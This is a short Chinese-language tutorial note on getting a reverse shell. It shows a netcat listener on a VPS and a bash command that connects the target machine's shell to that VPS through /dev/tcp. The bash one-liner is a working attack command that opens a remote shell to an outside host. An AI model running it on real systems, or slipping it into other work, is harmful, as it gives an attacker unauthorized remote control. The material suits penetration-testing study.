# Requirements
首先要有一台拥有公网`ip`的机子，比如说一台`vps`，

其次靶机需要可以访问外网，且可以执行命令

# vps上的工作
用`ssh`连接上`vps`，然后使用`netcat`监听端口
```shell
nc -lvvp <port>
```

# 靶机上的工作
## 利用bash反弹shell
创建一个新的`bash`进程，重定向输入输出到`vps`
```shell
bash -c "bash -i >& /dev/tcp/<vps_ip>/<vps_listen_port> 0>&1"
```

#Web #反弹shell 